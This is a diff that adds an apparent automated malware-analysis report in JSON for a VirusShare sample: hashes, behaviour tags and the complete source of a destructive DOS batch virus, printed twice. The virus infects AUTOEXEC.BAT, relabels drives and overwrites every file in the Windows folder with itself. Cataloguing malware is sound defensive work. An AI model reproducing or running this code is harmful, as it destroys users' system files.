@@ -1,0 +1,55 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "AUTOEXEC": "Runs when the Word document is opened",
+            "WINDOWS": "May enumerate application windows"
+        },
+        "macro": "@ECHO OFF\nIF EXIST C:\\AU.TXT GOTO DATE\nCOPY C:\\AUTOEXEC.BAT C:\\AU.TXT >NUL\nCOPY %0+C:\\AU.TXT C:\\AUTOEXEC.BAT >NUL\nATTRIB C:\\AU.TXT +H +R +S\n:DATE\nECHO |DATE| FIND \"11\" >NUL\nIF ERRORLEVEL 1 GOTO EXI\nIF ERRORLEVEL 0 GOTO WAR\n:WAR\nLABEL C: FATVIRUS >NUL\nLABEL D: CMOSKILL >NUL\nREM KAMIKAZE TECHNOLOGIES C.A.P.S.\nCTTY >NUL\nREM OWERWRITTEN DESTRUCTION CODE\nFOR %%I IN (C:\\WINDOWS\\*.*) DO COPY %0 %%I >NUL\n:FUCK\n@ECHO FUCK YOU GATES !!!\nGOTO FUCK\n:EXI\nEXIT"
+    },
+    "filename": "VirusShare_d518231463cc6d0e1ed041290b04b553",
+    "filesize": 470,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "d518231463cc6d0e1ed041290b04b553",
+        "sha1": "0de7b36b48f69485977169aa19736899650feb0f",
+        "sha256": "d387e5db2f05779d3adc3b8aadab035a597fed2cfde5e81f2dd9ae89e7c1fae0"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@ECHO OFF",
+            "IF EXIST C:\\AU.TXT GOTO DATE",
+            "COPY C:\\AUTOEXEC.BAT C:\\AU.TXT >NUL",
+            "COPY %0+C:\\AU.TXT C:\\AUTOEXEC.BAT >NUL",
+            "ATTRIB C:\\AU.TXT +H +R +S",
+            ":DATE",
+            "ECHO |DATE| FIND \"11\" >NUL",
+            "IF ERRORLEVEL 1 GOTO EXI",
+            "IF ERRORLEVEL 0 GOTO WAR",
+            ":WAR",
+            "LABEL C: FATVIRUS >NUL",
+            "LABEL D: CMOSKILL >NUL",
+            "REM KAMIKAZE TECHNOLOGIES C.A.P.S.",
+            "CTTY >NUL",
+            "REM OWERWRITTEN DESTRUCTION CODE",
+            "FOR %%I IN (C:\\WINDOWS\\*.*) DO COPY %0 %%I >NUL",
+            ":FUCK",
+            "@ECHO FUCK YOU GATES !!!",
+            "GOTO FUCK",
+            ":EXI",
+            "EXIT"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.264315",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
